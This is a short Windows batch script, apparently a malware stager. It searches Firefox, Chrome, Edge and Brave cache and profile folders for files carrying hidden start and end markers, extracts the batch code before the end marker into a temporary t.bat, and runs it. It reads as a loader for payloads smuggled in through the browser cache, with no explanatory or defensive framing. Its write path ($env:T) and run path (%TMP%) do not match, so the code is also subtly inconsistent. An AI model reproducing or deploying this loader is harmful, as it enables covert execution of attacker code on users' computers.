@echo off
setlocal EnableExtensions
set "M=CDRP7F3A9D2B8C4"
set "E=CDRPEND7F3A9D2"
for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %%f in (*) do @find "%M%" "%%f">nul&&find "%E%" "%%f">nul&&powershell -nop -c "$t=[IO.File]::ReadAllText('%%f');$i=$t.IndexOf('REM %E%');if($i -gt 0){[IO.File]::WriteAllText($env:T+'\t.bat',$t.Substring(0,$i).TrimEnd())}"&&goto run
for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %%f in (f_*) do @find "%M%" "%%f">nul&&find "%E%" "%%f">nul&&powershell -nop -c "$t=[IO.File]::ReadAllText('%%f');$i=$t.IndexOf('REM %E%');if($i -gt 0){[IO.File]::WriteAllText($env:T+'\t.bat',$t.Substring(0,$i).TrimEnd())}"&&goto run
for /r "%LOCALAPPDATA%\Microsoft\Edge\User Data" %%f in (f_*) do @find "%M%" "%%f">nul&&find "%E%" "%%f">nul&&powershell -nop -c "$t=[IO.File]::ReadAllText('%%f');$i=$t.IndexOf('REM %E%');if($i -gt 0){[IO.File]::WriteAllText($env:T+'\t.bat',$t.Substring(0,$i).TrimEnd())}"&&goto run
for /r "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data" %%f in (f_*) do @find "%M%" "%%f">nul&&find "%E%" "%%f">nul&&powershell -nop -c "$t=[IO.File]::ReadAllText('%%f');$i=$t.IndexOf('REM %E%');if($i -gt 0){[IO.File]::WriteAllText($env:T+'\t.bat',$t.Substring(0,$i).TrimEnd())}"&&goto run
exit /b 1
:run
if exist "%TMP%\t.bat" call "%TMP%\t.bat"
exit /b 0
